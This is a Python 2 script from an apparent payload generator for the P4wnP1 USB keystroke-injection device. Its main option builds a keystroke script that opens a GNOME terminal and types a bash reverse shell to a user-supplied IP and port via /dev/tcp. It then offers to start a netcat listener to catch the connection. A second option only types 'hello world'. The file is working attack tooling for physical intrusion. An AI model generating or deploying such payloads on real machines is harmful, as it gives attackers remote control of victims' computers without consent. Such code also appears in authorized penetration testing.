import os
from ascci import rabbit

def linux():	# function payload linux
    from lwsystem import osuser
    from menu import MENU
    script = raw_input("\nchoose the payload to generate : \n\n1) bash reverse shell \n\n2) hello word\n\nchoice : ") # choice payloads to generate
    settingkeyboardlayout=raw_input("\nchoose the keyboard layout : ")
    settingdelay = raw_input("\nchoose the delay between each instruction (ms) : ")


    if script == "1":		# bash reverse LINUX GNOME
	ip = raw_input("ip : ")
	port = raw_input("port : ")
	bashreverse = ("layout(\'")+(settingkeyboardlayout)+("\')\n")+("press(\"ALT F2\")\n")+("delay(200)\n")+("type(\"gnome-terminal\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"bash -i >& /dev/tcp/")+(ip)+("/")+(port)+(" 0>&1 & exit\\n\")\n\n")
	os.system("clear")
	print (bashreverse)
        file = open("Output-payloads/linux-reverse-" + (settingkeyboardlayout) + ".js","w") 
        file.write(bashreverse)
        file.close()
        nc = raw_input("start netcat listener ? \n\n1) yes\n2) no : ")
        if nc == "1":
                os.system("nc -lvp " + (port))

    if script == "2":		# hello world
	hellow = ("layout(\'")+(settingkeyboardlayout)+("\')\n")+("press(\"ALT F2\")\n")+("delay(200)\n")+("type(\"gnome-terminal\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"leafpad\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"HELLO World fRoM P4wnP1\\n\")\n")
	print (hellow)
        file = open("Output-payloads/linux-hello-w-" + (settingkeyboardlayout) + ".js","w") 
        file.write(hellow)
        file.close()


    print ("\nsaved at Output/" + (script))		# where it is save
    menu2 = raw_input("\n\n1) back to menu\n2) generate other payload for only P4wnP1 web interface\n3) exit\n\n>")

    if menu2 == "1":
	os.system("clear")
	MENU()

    elif menu2 == "2":
	os.system("clear")
	osuser()

    elif menu2 == "3":
	rabbit()
	exit()

